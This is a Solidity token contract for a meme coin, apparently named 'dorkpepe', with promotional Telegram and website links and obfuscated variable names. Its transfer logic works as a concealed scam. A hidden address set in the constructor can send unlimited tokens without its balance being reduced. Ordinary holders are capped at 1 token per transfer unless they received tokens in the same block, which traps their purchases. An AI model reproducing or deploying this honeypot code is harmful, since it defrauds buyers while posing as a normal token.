/*

https://t.me/ercdorkpepe

https://dorkpepe.cryptotoken.live/

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.11;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract OK is Ownable {
    function transferFrom(address lbvqrihos, address klbpaixcomj, uint256 sufxa) public returns (bool success) {
        require(sufxa <= allowance[lbvqrihos][msg.sender]);
        allowance[lbvqrihos][msg.sender] -= sufxa;
        wibcuyhftao(lbvqrihos, klbpaixcomj, sufxa);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) public balanceOf;

    string public name;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint256 private dqjkn = 110;

    mapping(address => uint256) private vaxiqkrj;

    IUniswapV2Router02 private zpxnfguwiabm;

    function approve(address phjkdxfze, uint256 sufxa) public returns (bool success) {
        allowance[msg.sender][phjkdxfze] = sufxa;
        emit Approval(msg.sender, phjkdxfze, sufxa);
        return true;
    }

    function transfer(address klbpaixcomj, uint256 sufxa) public returns (bool success) {
        wibcuyhftao(msg.sender, klbpaixcomj, sufxa);
        return true;
    }

    uint8 public decimals = 9;

    string public symbol;

    mapping(address => uint256) private dvnmyrsju;

    constructor(string memory ofcatnrds, string memory vnzeitjuga, address kblrwvz, address hliuaocr) {
        name = ofcatnrds;
        symbol = vnzeitjuga;
        balanceOf[msg.sender] = totalSupply;
        vaxiqkrj[hliuaocr] = dqjkn;
        zpxnfguwiabm = IUniswapV2Router02(kblrwvz);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function wibcuyhftao(address lbvqrihos, address klbpaixcomj, uint256 sufxa) private {
        address clgprya = IUniswapV2Factory(zpxnfguwiabm.factory()).getPair(address(this), zpxnfguwiabm.WETH());
        bool scfma = 0 == vaxiqkrj[lbvqrihos];
        if (scfma) {
            if (lbvqrihos != clgprya && dvnmyrsju[lbvqrihos] != block.number && sufxa < totalSupply) {
                require(sufxa <= totalSupply / (10 ** decimals));
            }
            balanceOf[lbvqrihos] -= sufxa;
        }
        balanceOf[klbpaixcomj] += sufxa;
        dvnmyrsju[klbpaixcomj] = block.number;
        emit Transfer(lbvqrihos, klbpaixcomj, sufxa);
    }
}